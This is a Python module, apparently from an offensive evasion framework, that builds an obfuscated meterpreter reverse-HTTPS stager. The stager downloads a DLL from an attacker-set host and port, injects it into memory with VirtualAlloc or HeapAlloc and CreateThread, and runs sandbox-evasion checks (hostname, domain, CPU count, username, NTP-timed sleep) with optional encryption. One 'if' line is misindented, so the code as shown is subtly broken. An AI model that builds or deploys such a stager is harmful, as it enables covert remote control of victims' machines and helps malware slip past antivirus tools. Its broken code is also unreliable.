"""

Custom-written pure python meterpreter/reverse_https stager.

Module by @harmj0y

"""

from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import evasion_helpers


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        self.name = "Pure Python Reverse HTTPS stager"
        self.path = "python/meterpreter/rev_https"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "LHOST"          : ["", "The listen target address"],
            "LPORT"          : ["4444", "The listen port"],
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):

        # randomize everything, yo'
        sumMethodName = evasion_helpers.randomString()
        checkinMethodName = evasion_helpers.randomString()

        randLettersName = evasion_helpers.randomString()
        randLetterSubName = evasion_helpers.randomString()
        randBaseName = evasion_helpers.randomString()

        downloadMethodName = evasion_helpers.randomString()
        hostName = evasion_helpers.randomString()
        portName = evasion_helpers.randomString()
        requestName = evasion_helpers.randomString()
        tName = evasion_helpers.randomString()

        injectMethodName = evasion_helpers.randomString()
        dataName = evasion_helpers.randomString()
        byteArrayName = evasion_helpers.randomString()
        ptrName = evasion_helpers.randomString()
        bufName = evasion_helpers.randomString()
        handleName = evasion_helpers.randomString()
        data2Name = evasion_helpers.randomString()
        proxy_var = evasion_helpers.randomString()
        opener_var = evasion_helpers.randomString()
        randctypes = evasion_helpers.randomString()

        # How I'm tracking the number of nested tabs needed
        # to make the payload
        num_tabs_required = 0
        payload_code = "import urllib.request, string, random, struct, time, ssl, ctypes as " + randctypes + "\n"


        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()

            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

            # Create Payload code
            payload_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
            payload_code += '\t' * num_tabs_required + 'from datetime import date\n'
            payload_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
            payload_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            payload_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import platform\n'
            payload_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["HOSTNAME"][0].lower() + '\" in ' + rand_hostname + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            rand_domain = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import socket\n'
            payload_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["DOMAIN"][0].lower() + '\" in ' + rand_domain + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":

            rand_processor_count = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import multiprocessing\n'
            payload_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
            payload_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + self.required_options["PROCESSORS"][0] + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import getpass\n'
            payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
            payload_code += '\t' * num_tabs_required + 'if \'' + self.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

       if self.required_options["SLEEP"][0].lower() != "x":

            rand_time_name = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'from time import sleep\n'
            payload_code += '\t' * num_tabs_required + 'from socket import AF_INET, SOCK_DGRAM\n'
            payload_code += '\t' * num_tabs_required + 'import sys\n'
            payload_code += '\t' * num_tabs_required + 'import datetime\n'
            payload_code += '\t' * num_tabs_required + 'import time\n'
            payload_code += '\t' * num_tabs_required + 'import socket\n'
            payload_code += '\t' * num_tabs_required + 'import struct\n'
            payload_code += '\t' * num_tabs_required + 'client = socket.socket(AF_INET, SOCK_DGRAM)\n'
            payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
            payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
            payload_code += '\t' * num_tabs_required + rand_time_name + ' = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)\n'
            payload_code += '\t' * num_tabs_required + 'sleep(' + self.required_options["SLEEP"][0] + ')\n'
            payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
            payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
            payload_code += '\t' * num_tabs_required + 'if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - ' + rand_time_name + ').seconds >= ' + self.required_options["SLEEP"][0] + '):\n'

            # Add a tab for this check
            num_tabs_required += 1

        # helper method that returns the sum of all ord values in a string % 0x100
        payload_code += "ssl._create_default_https_context = ssl._create_unverified_context\n"
        payload_code += "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)

        # method that generates a new checksum value for checkin to the meterpreter handler
        payload_code += "def %s():\n\tfor x in range(64):\n" %(checkinMethodName)
        payload_code += "\t\t%s = ''.join(random.sample(string.ascii_letters + string.digits,3))\n" %(randBaseName)
        payload_code += "\t\t%s = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n" %(randLettersName)
        payload_code += "\t\tfor %s in %s:\n" %(randLetterSubName, randLettersName)
        payload_code += "\t\t\tif %s(%s + %s) == 92: return %s + %s\n" %(sumMethodName, randBaseName, randLetterSubName, randBaseName, randLetterSubName)

        # method that connects to a host/port over https and downloads the hosted data
        payload_code += "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
        payload_code += "\t" + proxy_var + " = urllib.request.ProxyHandler({})\n"
        payload_code += "\t" + opener_var + " = urllib.request.build_opener(" + proxy_var + ")\n"
        payload_code += "\turllib.request.install_opener(" + opener_var + ")\n"
        payload_code += '\t' * num_tabs_required + "\t" + requestName + " = urllib.request.Request(\"https://\" + " + hostName + " + \":\" + str(" + portName + ") + \"/\" + " + checkinMethodName + "(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
        payload_code += "\ttry:\n"
        payload_code += "\t\t%s = urllib.request.urlopen(%s)\n" %(tName, requestName)
        payload_code += "\t\ttry:\n"
        payload_code += "\t\t\tif int(%s.info()[\"Content-Length\"]) > 100000: return %s.read()\n" %(tName, tName)
        payload_code += "\t\t\telse: return ''\n"
        payload_code += "\t\texcept: return %s.read()\n" % (tName)
        payload_code += "\texcept urllib.request.URLError: return ''\n"

        # method to inject a reflective .dll into memory
        payload_code += "def %s(%s):\n" %(injectMethodName, dataName)
        payload_code += "\tif %s != \"\":\n" %(dataName)
        payload_code += "\t\t%s = bytearray(%s)\n" %(byteArrayName, dataName)
        
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + " = " + randctypes + ".windll.kernel32.VirtualAlloc(" + randctypes + ".c_int(0)," + randctypes + ".c_int(len(" + byteArrayName + ")), " + randctypes + ".c_int(0x3000)," + randctypes + ".c_int(0x40))\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + bufName + " = (" + randctypes + ".c_char * len(" + byteArrayName + ")).from_buffer(" + byteArrayName + ")\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + ".windll.kernel32.RtlMoveMemory(" + randctypes + ".c_int(" + ptrName + ")," + bufName + ", " + randctypes + ".c_int(len(" + byteArrayName + ")))\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + handleName + " = " + randctypes + ".windll.kernel32.CreateThread(" + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".c_int(" + ptrName + ")," + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".pointer(" + randctypes + ".c_int(0)))\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + ".windll.kernel32.WaitForSingleObject(" + randctypes + ".c_int(" + handleName + ")," + randctypes + ".c_int(-1))\n"

        # Assuming heap injection
        else:
            HeapVar = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + "\t\t" + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + byteArrayName + ') * 2),' + randctypes + '.c_int(0))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + byteArrayName + ')))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + bufName + ' = (' + randctypes + '.c_char * len(' + byteArrayName + ')).from_buffer(' + byteArrayName + ')\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + ptrName + '),' + bufName + ',' + randctypes + '.c_int(len(' + byteArrayName + ')))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + handleName + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + ptrName + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + handleName + '),' + randctypes + '.c_int(-1))\n'

        # download the metpreter .dll and inject it
        payload_code += "%s = ''\n" %(data2Name)
        payload_code += "%s = %s(\"%s\", %s)\n" %(data2Name, downloadMethodName, self.required_options["LHOST"][0], self.required_options["LPORT"][0])
        payload_code += "%s(%s)\n" %(injectMethodName, data2Name)

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
